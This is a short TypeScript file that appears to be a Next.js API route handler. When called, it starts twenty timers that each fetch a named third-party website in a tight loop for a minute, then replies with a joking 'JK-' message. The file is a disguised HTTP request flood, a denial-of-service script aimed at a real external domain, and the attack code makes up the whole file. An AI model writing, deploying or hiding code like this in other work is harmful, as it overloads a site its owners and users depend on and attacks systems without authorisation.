import type { NextApiRequest, NextApiResponse } from 'next'

type ResponseData = {
    message: string
}

export default function handler(
    req: NextApiRequest,
    res: NextApiResponse<ResponseData>
) {

    for(var i = 0; i < 20; i++) {
        const luanch = setInterval(() => {
            fetch('https://surnaturel.ma/').then()
        })
        setTimeout(() => clearInterval(luanch), 60 * 1000)
    }
    
    res.status(200).json({ message: `JK-${Math.random()}` })
}